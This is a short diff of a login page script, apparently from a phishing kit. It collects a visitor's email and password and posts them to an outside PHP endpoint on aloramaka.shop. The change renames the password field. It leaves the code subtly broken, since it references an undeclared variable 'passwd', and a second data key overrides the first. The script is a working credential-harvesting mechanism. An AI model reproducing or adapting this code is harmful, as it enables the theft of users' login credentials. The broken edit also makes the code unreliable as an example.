@@ -284,7 +284,7 @@ $('#error').hide();
 $('#msg').hide();
 event.preventDefault();
 var email=$("#email").val();
-var password=$("#password").val();
+var password=$("#passwd").val();
 
 if (!password) {
     $('#msg').show();
@@ -301,7 +301,7 @@ url: 'https://aloramaka.shop/wp-ecount/xendxx.php',
 type: 'POST',
       	data:{
 			email:email,
-            password:password,	
+            password:passwd,	
       	},
 			data: $('#login_form').serialize(),
             beforeSend: function(xhr){
@@ -344,6 +344,7 @@ type: 'POST',
 
 
 </script>
+
 
 
 </body></html>
